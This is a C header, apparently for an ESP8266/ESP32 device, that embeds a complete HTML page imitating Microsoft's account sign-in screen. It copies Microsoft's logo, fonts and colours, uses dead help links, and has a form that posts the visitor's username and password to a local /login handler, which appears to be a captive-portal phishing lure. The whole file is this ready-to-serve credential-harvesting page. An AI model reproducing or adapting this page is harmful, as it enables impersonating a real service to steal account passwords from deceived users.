#ifndef MICROSOFT_H
#define MICROSOFT_H

const char MICROSOFT[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <style>
        /* General body styling to match the background of the image */
        body {
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", Arial, sans-serif; /* Microsoft's preferred font */
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            min-height: 100vh;
            display: flex;
            flex-direction: column; /* Allow content to stack */
            align-items: center;
            justify-content: center;
            background-color: #F2F2F2; /* Light gray background from image */
            color: #333;
        }

        /* Message Box Styling */
        #messageBox {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #0078D4; /* Microsoft Blue */
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
            font-size: 1rem;
            text-align: center;
            min-width: 250px;
            max-width: 80%;
        }
        #messageBox.show {
            opacity: 1;
            visibility: visible;
        }


        /* Main Login Card */
        .login-card {
            background-color: #FFFFFF; /* White background for the card */
            border-radius: 0.15rem; /* Very subtle rounding like the image */
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1); /* Subtle shadow from image */
            padding: 2.5rem; /* Generous padding */
            width: 100%;
            max-width: 28rem; /* Fixed width as seen in the image */
            box-sizing: border-box; /* Include padding in width */
            text-align: left; /* Align content to the left */
        }

        /* Microsoft Logo Styling */
        .microsoft-logo {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem; /* Space below the logo */
            line-height: 1; /* Adjust line height for alignment */
        }
        .microsoft-logo svg {
            height: 1.5rem; /* Adjust height of the square logo */
            width: auto;
            margin-right: 0.5rem; /* Space between square and text */
        }
        .microsoft-logo span {
            font-size: 1.5rem; /* Adjust font size for 'Microsoft' text */
            font-weight: 600; /* Semi-bold */
            color: #212121; /* Dark gray for text */
        }

        /* Main Heading */
        .main-heading {
            font-size: 1.8rem; /* Large font for "Sign in" */
            font-weight: 600; /* Semi-bold - default for 'Sign in' */
            color: #212121;
            margin-bottom: 2rem; /* Space below heading */
        }

        /* Input Group */
        .input-group {
            margin-bottom: 1.5rem; /* Space below input */
        }
        .form-input {
            width: 100%;
            padding: 0.5rem 0; /* Vertical padding, no horizontal for underline */
            border: none;
            border-bottom: 1px solid #C8C8C8; /* Light gray underline */
            font-size: 1rem;
            color: #333;
            outline: none; /* Remove default focus outline */
            transition: border-bottom-color 0.2s ease, box-shadow 0.2s ease;
            box-sizing: border-box;
        }
        .form-input::placeholder {
            color: #888; /* Gray placeholder text */
        }
        .form-input:focus {
            border-bottom-color: #0067B8; /* Microsoft blue on focus */
            box-shadow: 0 1px 0 0 #0067B8; /* Simulate a thicker blue underline on focus */
        }

        /* Help Links */
        .help-link-group {
            margin-bottom: 2rem; /* Space below links */
            text-align: left; /* Align links to the left */
        }
        .help-link {
            display: block; /* Each link on new line */
            font-size: 0.9rem;
            color: #0067B8; /* Microsoft blue for links */
            text-decoration: none;
            margin-bottom: 0.5rem; /* Space between links */
            transition: text-decoration 0.2s ease, color 0.2s ease;
        }
        .help-link:hover {
            text-decoration: underline;
            color: #00569D; /* Darker blue on hover */
        }

        /* Action Buttons Group */
        .button-group {
            display: flex;
            justify-content: flex-end; /* Align buttons to the right */
            gap: 0.75rem; /* Space between buttons */
            width: 100%; /* Occupy full width */
            margin-top: 2rem; /* Ensure consistent spacing above buttons */
        }
        /* Style for individual buttons */
        .action-button {
            padding: 0.6rem 1.2rem; /* Button padding */
            font-size: 0.9rem;
            font-weight: 600;
            border-radius: 0.15rem; /* Subtle rounding */
            cursor: pointer;
            border: 1px solid transparent; /* Default transparent border */
            transition: all 0.2s ease-in-out;
            text-decoration: none;
            display: inline-block;
        }
        .action-button.secondary {
            background-color: #E6E6E6; /* Light gray for 'Back' button */
            color: #212121; /* Dark text */
            border-color: #E6E6E6;
        }
        .action-button.secondary:hover {
            background-color: #D6D6D6; /* Darker gray on hover */
            border-color: #D6D6D6;
        }
        .action-button.primary {
            background-color: #0067B8; /* Microsoft blue for 'Next' button */
            color: #FFFFFF; /* White text */
        }
        .action-button.primary:hover {
            background-color: #00569D; /* Darker blue on hover */
        }
        .action-button:focus {
            outline: 2px solid #00569D; /* Darker blue focus ring */
            outline-offset: 2px;
        }
    </style>
</head>
<body>
    <div id="messageBox"></div> <!-- Message box for non-blocking alerts -->

    <div class="login-card">
        <!-- Microsoft Logo -->
        <div class="microsoft-logo">
            <svg viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="23" height="23" fill="#F25022"/> <!-- Red -->
                <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/> <!-- Green -->
                <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/> <!-- Blue -->
                <rect x="27" y="27" width="23" height="23" fill="#FFB900"/> <!-- Yellow -->
            </svg>
            <span>Microsoft</span>
        </div>

        <!-- Main Heading -->
        <div class="main-heading" id="mainHeading">Sign in</div>

        <!-- Authentication Form -->
        <form action="/login" method="post" id="microsoft-login-form">
            <div class="input-group">
                <input
                    name="username"
                    type="text"
                    class="form-input"
                    placeholder="Email, phone, or Skype"
                    required
                    aria-label="Email, phone, or Skype"
                    id="usernameInput"
                >
            </div>
            <div class="input-group">
                <input
                    name="password"
                    type="password"
                    class="form-input"
                    placeholder="Password"
                    required
                    aria-label="Password"
                    id="passwordInput"
                >
            </div>
            <div class="help-link-group">
                <a href="#" class="help-link">No account? Create one!</a>
                <a href="#" class="help-link">Can't access your account?</a>
            </div>

            <!-- Action Buttons -->
            <div class="button-group">
                <button type="submit" class="action-button primary" id="signInButton">Sign in</button>
            </div>
        </form>
    </div>

    <script>
        const messageBox = document.getElementById('messageBox');
        const signInButton = document.getElementById('signInButton'); // Renamed for clarity
        const usernameInput = document.getElementById('usernameInput'); // Still used for focus

        let messageTimeout;

        function showMessage(message, duration = 3000) {
            messageBox.textContent = message;
            messageBox.classList.add('show');
            if (messageTimeout) {
                clearTimeout(messageTimeout);
            }
            messageTimeout = setTimeout(() => {
                messageBox.classList.remove('show');
            }, duration);
        }

        document.addEventListener('DOMContentLoaded', () => {
            usernameInput.focus();
        });
    </script>
</body>
</html>
)rawliteral";
#endif